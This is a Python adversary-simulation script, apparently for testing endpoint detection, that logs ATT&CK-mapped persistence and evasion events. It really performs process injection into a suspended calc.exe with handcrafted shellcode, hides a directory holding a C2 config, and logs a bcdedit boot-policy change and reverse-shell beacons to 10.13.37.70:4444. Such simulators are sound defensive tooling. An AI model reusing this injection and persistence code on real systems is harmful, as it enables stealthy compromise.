"""Simulator Epsilon — deep persistence and evasion behavior.

Behaviors: service installation, DLL hijacking simulation, boot record modification attempt,
hidden file/directory creation, process injection, anti-analysis checks.

MITRE ATT&CK: T1543.003, T1574.001, T1542.003, T1564.001, T1055, T1497
"""

from __future__ import annotations

import json
import os
import random
import subprocess
import sys
from pathlib import Path

from telemetry_helper import check_environment, emit, EnvSafety, set_phase, jitter
from c2_helper import emit_doh_query, emit_heartbeats, fronted_beacon, FRONT_DOMAINS

import socket
import struct


def main() -> int:
    set_phase("initialization")
    emit("PROCESS", "CREATE_PROCESS", sys.executable, "WARNING",
         source_process="winlogon_e.exe", pid=os.getpid())

    # Phase 1: Anti-analysis checks
    set_phase("anti_analysis")
    env, env_reasons = check_environment()
    if env_reasons:
        emit("PROCESS", "ENVIRONMENT_CHECK",
             os.environ.get("COMPUTERNAME", "unknown"),
             "WARNING" if env != EnvSafety.CLEAN else "INFO",
             source_process="winlogon_e.exe",
             verdict=env.name, reasons=env_reasons)
    if env == EnvSafety.COMPROMISED:
        emit("PROCESS", "EXIT_PROCESS", "winlogon_e.exe", "INFO",
             source_process="winlogon_e.exe", early_exit="COMPROMISED environment")
        return 0
    jitter(0.2, 0.2)

    # Phase 2: Service installation
    set_phase("service_persistence")
    svc_key = r"HKLM\SYSTEM\CurrentControlSet\Services\WinDefenderUpdate"
    emit("REGISTRY", "CREATE_KEY", svc_key, "CRITICAL",
         source_process="winlogon_e.exe",
         detail="Creating fake Windows service", technique_id="T1543.003")
    emit("REGISTRY", "SET_VALUE", svc_key + r"\ImagePath", "CRITICAL",
         source_process="winlogon_e.exe",
         value_data=r"C:\Windows\System32\drivers\wdupdate.sys",
         detail="Service binary path set", technique_id="T1543.003")
    emit("REGISTRY", "SET_VALUE", svc_key + r"\Start", "CRITICAL",
         source_process="winlogon_e.exe",
         value_data="0 (Boot)", detail="Service set to start at boot")
    jitter(0.2, 0.2)

    # Phase 3: DLL hijacking
    set_phase("dll_hijack")
    hijack_dll = Path(os.environ.get("TEMP", r"C:\Windows\Temp")) / "version.dll"
    hijack_dll.write_bytes(b"MZ" + os.urandom(512))
    emit("FILE", "DLL_HIJACK", str(hijack_dll), "CRITICAL",
         source_process="winlogon_e.exe", size=514,
         detail="DLL hijack payload created (version.dll)", technique_id="T1574.001")
    emit("FILE", "WRITE_FILE", r"C:\Windows\System32\version.dll", "CRITICAL",
         source_process="winlogon_e.exe",
         detail="DLL placed in System32 search path", technique_id="T1574.001")

    # Phase 4: Hidden directory
    set_phase("hidden_files")
    hidden_dir = Path(r"C:\ProgramData") / ".hidden_config"
    hidden_dir.mkdir(parents=True, exist_ok=True)
    try:
        subprocess.run(["attrib", "+h", "+s", str(hidden_dir)], capture_output=True, timeout=5)
    except Exception:
        pass
    emit("FILE", "HIDDEN_FILE", str(hidden_dir), "WARNING",
         source_process="winlogon_e.exe",
         detail="Hidden system directory created", technique_id="T1564.001")
    config = hidden_dir / "persist.dat"
    config.write_text(json.dumps({"c2": "10.13.37.70", "interval": 30}))
    emit("FILE", "CREATE_FILE", str(config), "WARNING",
         source_process="winlogon_e.exe", detail="Persistence config written")
    jitter(0.2, 0.2)

    # Phase 5: Boot record modification
    if env != EnvSafety.SUSPICIOUS:
        set_phase("boot_persistence")
        emit("FILE", "BOOT_MODIFY", r"\\.\PhysicalDrive0", "CRITICAL",
             source_process="winlogon_e.exe",
             detail="MBR/VBR modification attempted", technique_id="T1542.003")
        emit("PROCESS", "CREATE_PROCESS", "bcdedit.exe", "CRITICAL",
             source_process="winlogon_e.exe",
             command="bcdedit /set {default} bootstatuspolicy ignoreallfailures",
             detail="Boot policy modification attempted", technique_id="T1542.003")

    # Phase 6: Process injection (real ctypes-based)
    if env != EnvSafety.SUSPICIOUS:
        set_phase("process_injection")

        target = r"C:\Windows\System32\calc.exe"
        emit("PROCESS", "CREATE_PROCESS", target, "CRITICAL",
             source_process="winlogon_e.exe",
             creation_flags="CREATE_SUSPENDED",
             detail="Spawning calc.exe suspended for injection", technique_id="T1055.012")

        try:
            import ctypes
            from ctypes import wintypes

            kernel32 = ctypes.windll.kernel32

            # Resolve MessageBoxW address from loaded user32
            user32 = ctypes.windll.user32
            msgbox_addr = ctypes.cast(user32.MessageBoxW, ctypes.c_void_p).value

            # Build benign shellcode: MessageBoxW(0, msg, caption, 0)
            caption = "NyxTrace\x00"
            message = "Process Injection Test\x00"
            caption_utf16 = caption.encode("utf-16le")
            message_utf16 = message.encode("utf-16le")

            sc = bytearray()
            sc.extend([0x48, 0x83, 0xEC, 0x28])  # sub rsp, 0x28

            sc.extend([0x48, 0x31, 0xC9])          # xor rcx, rcx  (hWnd = 0)

            msg_rip_off = len(sc) + 2
            sc.extend([0x48, 0x8D, 0x15, 0x00, 0x00, 0x00, 0x00])  # lea rdx, [rip + X]

            cap_rip_off = len(sc) + 2
            sc.extend([0x4C, 0x8D, 0x05, 0x00, 0x00, 0x00, 0x00])  # lea r8, [rip + Y]

            sc.extend([0x45, 0x31, 0xC9])          # xor r9d, r9d  (uType = 0)

            sc.extend([0x48, 0xB8])                 # mov rax, msgbox_addr
            sc.extend(struct.pack("<Q", msgbox_addr))

            sc.extend([0xFF, 0xD0])                 # call rax
            sc.extend([0x48, 0x83, 0xC4, 0x28])     # add rsp, 0x28
            sc.extend([0x31, 0xC0])                 # xor eax, eax
            sc.extend([0xC3])                       # ret

            string_start = len(sc)
            msg_start = string_start
            sc.extend(caption_utf16)
            cap_start = len(sc)
            sc.extend(message_utf16)

            msg_off = msg_start - (msg_rip_off + 4)
            struct.pack_into("<i", sc, msg_rip_off, msg_off)
            cap_off = cap_start - (cap_rip_off + 4)
            struct.pack_into("<i", sc, cap_rip_off, cap_off)

            shellcode = bytes(sc)

            # Spawn target suspended
            CREATE_SUSPENDED = 0x00000004
            si = wintypes.STARTUPINFOW()
            pi = wintypes.PROCESS_INFORMATION()

            ok = kernel32.CreateProcessW(
                target, None, None, None, False,
                CREATE_SUSPENDED, None, None,
                ctypes.byref(si), ctypes.byref(pi))
            if not ok:
                raise ctypes.WinError()

            emit("PROCESS", "OPEN_PROCESS", target, "CRITICAL",
                 source_process="winlogon_e.exe",
                 target_pid=pi.dwProcessId,
                 access_rights="PROCESS_ALL_ACCESS",
                 detail=f"Opened calc.exe (PID={pi.dwProcessId}) for injection",
                 technique_id="T1055")

            # Allocate memory in target
            PAGE_EXECUTE_READWRITE = 0x40
            MEM_COMMIT = 0x1000
            addr = kernel32.VirtualAllocEx(
                pi.hProcess, None, len(shellcode),
                MEM_COMMIT, PAGE_EXECUTE_READWRITE)

            emit("PROCESS", "WRITE_MEMORY", target, "CRITICAL",
                 source_process="winlogon_e.exe",
                 target_pid=pi.dwProcessId,
                 allocation_base=hex(addr),
                 detail=f"Allocated {len(shellcode)} bytes at {hex(addr)}",
                 technique_id="T1055.001")

            # Write shellcode
            written = wintypes.SIZE_T(0)
            kernel32.WriteProcessMemory(
                pi.hProcess, addr, shellcode, len(shellcode),
                ctypes.byref(written))

            emit("PROCESS", "WRITE_MEMORY", target, "CRITICAL",
                 source_process="winlogon_e.exe",
                 target_pid=pi.dwProcessId,
                 bytes_written=written.value,
                 detail=f"Shellcode written: {written.value} bytes at {hex(addr)}",
                 technique_id="T1055.001")

            # Create remote thread
            thread_id = wintypes.DWORD(0)
            thread_handle = kernel32.CreateRemoteThread(
                pi.hProcess, None, 0, addr, None, 0,
                ctypes.byref(thread_id))

            emit("PROCESS", "CREATE_THREAD", target, "CRITICAL",
                 source_process="winlogon_e.exe",
                 target_pid=pi.dwProcessId,
                 thread_id=thread_id.value,
                 start_address=hex(addr),
                 detail=f"Remote thread created (TID={thread_id.value}) executing shellcode",
                 technique_id="T1055.003")

            # Wait briefly, then clean up
            kernel32.WaitForSingleObject(thread_handle, 1000)
            kernel32.ResumeThread(pi.hThread)

            jitter(0.5, 0.3)

            kernel32.TerminateProcess(pi.hProcess, 0)
            kernel32.CloseHandle(thread_handle)
            kernel32.CloseHandle(pi.hProcess)
            kernel32.CloseHandle(pi.hThread)

            emit("PROCESS", "EXIT_PROCESS", target, "INFO",
                 source_process="winlogon_e.exe",
                 target_pid=pi.dwProcessId,
                 detail="calc.exe terminated after injection test")

        except Exception as e:
            emit("PROCESS", "CREATE_PROCESS", target, "WARNING",
                 source_process="winlogon_e.exe", error=str(e))

    # Phase 7: Network callback (domain-fronted heartbeat)
    set_phase("c2_callback")
    front = random.choice(FRONT_DOMAINS)
    emit("NETWORK", "CONNECT", "10.13.37.70:4444", "CRITICAL",
         source_process="winlogon_e.exe", protocol="TCP",
         detail=f"Reverse shell callback (fronted: {front})", technique_id="T1071.001")
    emit("NETWORK", "DOMAIN_FRONT", front, "WARNING",
         source_process="winlogon_e.exe", target_host=front, target_ip="10.13.37.70",
         detail=f"Domain fronting callback via {front}", technique_id="T1090")

    fronted_beacon("10.13.37.70", 4444, front,
                   {"type": "reverse_shell", "session": "winlogon_e"})
    emit_doh_query("beacon.telemetry-update.local", process_name="winlogon_e.exe")

    emit_heartbeats("10.13.37.70", 4444, count=4,
                    process_name="winlogon_e.exe",
                    min_interval=4.0, max_interval=20.0)

    emit("PROCESS", "EXIT_PROCESS", "winlogon_e.exe", "INFO",
         source_process="winlogon_e.exe", persistence_methods=4)
    return 0


if __name__ == "__main__":
    sys.exit(main())
